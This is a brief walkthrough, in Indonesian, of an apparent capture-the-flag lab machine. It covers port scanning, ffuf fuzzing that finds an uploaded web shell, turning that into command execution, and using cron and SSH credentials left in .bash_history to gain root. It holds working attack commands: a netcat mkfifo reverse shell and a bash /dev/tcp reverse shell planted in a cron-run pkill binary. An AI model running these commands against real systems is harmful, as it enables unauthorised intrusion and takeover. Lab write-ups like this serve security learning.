1. scan 22 80 kebuka buka aja 
2. ada fungsi upload cek source code pas upload -> gitu sistemnya
3. di fuzz dir ada cvs -> coba dulu fuzz
4. ffuf -u "http://10.10.64.174/cvs/FUZZ.pdf.php" -w ~/wordlists/seclists/web-content/common.txt | tee fuzzcvs.txt
5. ada shell -> coba dulu
6. ffuf -u "http://10.10.64.174/cvs/shell.pdf.php?FUZZ=id" -w ~/wordlists/seclists/web-content/burp-parameter-names.txt -fw 1
7. bisa run command tuh -> revshell aja di urlencode -> pake revshell nc mkfifo dah gampang
8. dah bisa klaim user flag -> ke /etc cek cron.d cronjob  baca baca aja -> ssh cred ada di .bash_history home -> pas ssh
9. echo "bash -c 'bash -i >& /dev/tcp/10.9.0.169/6060 0>&1'" > bin/pkill ; chmod  +x bin/pkill
10. sambil nyalain nc -> klaim root
